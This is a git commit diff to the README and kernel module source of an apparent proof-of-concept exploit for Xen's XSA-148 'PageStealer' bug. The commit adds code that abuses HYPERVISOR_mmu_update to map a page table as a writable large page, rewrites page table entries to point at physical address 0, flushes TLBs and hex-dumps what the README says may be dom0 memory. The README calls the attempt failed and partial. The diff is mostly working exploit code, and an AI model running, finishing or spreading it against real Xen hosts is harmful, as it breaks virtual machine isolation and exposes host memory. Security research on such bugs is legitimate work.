442715236df4bb010107cf1992ccc4f61d387210
Zhuowei Zhang <zhuoweizhang@yahoo.com>
2015-11-01 01:34:43 -0500

    flush TLB after modifications; can dump page 0

--- README.md
+++ README.md
@@ -1,3 +1,6 @@
 Failed attempt to exploit Xen's PageStealer bug (XSA-148)
-It can map the l1 (smallest) pagetable as a huge writable page, but I couldn't figure out what to do from there. Hope someone else smarter could figure this out.
+
+It can map the l1 (smallest) pagetable as a huge writable page, and it can read what looks like the real page 0 from dom0, but I'm not sure whether I've actually managed to read the real memory or how to read other areas of memory. (Reading 0x100000 gives 0xc2s everywhere, which is of course wrong)
+
+Hope someone else smarter could figure this out.
 If you want to make this work, it's under GPLv2.
--- pagestealer.c
+++ pagestealer.c
@@ -21,7 +21,7 @@ static void domem(void)
 	// grab 8MB (somewhere in there should be 4MB aligned)
 	printk(DRVR_NAME " %lx %lx\n", allocaddr, alignedaddr);
 	bufptr = (unsigned long*) alignedaddr;
-	bufptr[0] = 0xdeadbeef;
+	bufptr[0] = 0xdeadf00d;
 	/*
 	preempt_disable();
 	HYPERVISOR_mmu_update(&u, 1, NULL, DOMID_SELF);
@@ -38,19 +38,26 @@ static void dopte(void) {
 	unsigned long pmd_addr;
 	unsigned long pmd_val_after;
 	unsigned long pmd_val_before;
-	unsigned long pte_val_before;
+	unsigned long pte_val_before[16];
+	unsigned long dumpaddr;
+	pte_t* pte_raw;
 	int rc, count;
+	struct mmuext_op mu;
+	int i;
+	dumpaddr = 0x0L;
 	pgd = pgd_offset(current->mm, alignedaddr);
 	pud = pud_offset(pgd, alignedaddr);
 	pmd = pmd_offset(pud, alignedaddr);
 	pte = pte_offset_kernel(pmd, alignedaddr);
 	pmd_addr = pmd_val(*pmd) & PTE_PFN_MASK;
-	printk(DRVR_NAME " pmd val %lx %lx\n", virt_to_phys(pmd), pmd_addr);
+	printk(DRVR_NAME " pmd val %llx %lx\n", virt_to_phys(pmd), pmd_addr);
 	pmd_val_before = pmd_val_ma(*pmd);
 
 	// prepare the mmu update
 	u.ptr = arbitrary_virt_to_machine(pmd).maddr | MMU_NORMAL_PT_UPDATE;
 	u.val = pmd_val_ma(*pmd) | (_PAGE_PSE | _PAGE_RW);
+	printk(DRVR_NAME " MA vs REG: %lx %lx %lx\n", pmd_val(*pmd), pmd_val_ma(*pmd), mfn_to_virt(pmd_val_ma(*pmd) & PTE_PFN_MASK));
+
 
 	// try to call the buggy function to set the pmd to a large page
 	preempt_disable();
@@ -60,18 +67,37 @@ static void dopte(void) {
 	printk(DRVR_NAME " target %lx post %d/%d pmd %lx val %x\n",
 		u.val, rc, count,
 		pmd_val_after, pte_val(*pte));
+	// flush tlbs
+	mu.cmd = MMUEXT_TLB_FLUSH_LOCAL;
+	HYPERVISOR_mmuext_op(&mu, 1, NULL, DOMID_SELF);
 	// do stupid stuff with the pte
-	pte_val_before = pte->pte;
-	pte->pte = (pte_val_before & (~PTE_PFN_MASK)) | 0;
-	// except it doesn't work
-	printk(DRVR_NAME " Failed to break out: still gives %lx\n", bufptr[0]);
-	
-	// fix the page before stuff crashes
-	pte->pte = pte_val_before;
-
+	for (i = 0; i < 16; i++) {
+		pte_t* p = pte + i;
+		pte_val_before[i] = p->pte;
+		p->pte = (dumpaddr + i*4096) | 3 /* present, rw */;
+	}
+	// change large pages back
 	u.val = pmd_val_before;
 	rc = HYPERVISOR_mmu_update(&u, 1, &count, DOMID_SELF);
+	// flush tlbs again
+	mu.cmd = MMUEXT_TLB_FLUSH_LOCAL;
+	HYPERVISOR_mmuext_op(&mu, 1, NULL, DOMID_SELF);
+	// except it doesn't work
+	//printk(DRVR_NAME " Failed to break out: still gives %lx\n", bufptr[0]);
+	print_hex_dump(KERN_INFO, "pagestealer ", DUMP_PREFIX_OFFSET, 16, 2,
+		bufptr, 0x1000, true);
+	// fix the page before stuff crashes
+	for (i = 0; i < 16; i++) {
+		pte_t* p = pte + i;
+		p->pte = pte_val_before[i];
+	}
+	mu.cmd = MMUEXT_TLB_FLUSH_LOCAL;
+	HYPERVISOR_mmuext_op(&mu, 1, NULL, DOMID_SELF);
+	//u.val = pmd_val_before;
+	//rc = HYPERVISOR_mmu_update(&u, 1, &count, DOMID_SELF);
+
 	preempt_enable();
+	//printk(DRVR_NAME " after switching back %lx\n", bufptr[0]);
 	
 }
 static void cleanmem(void) {
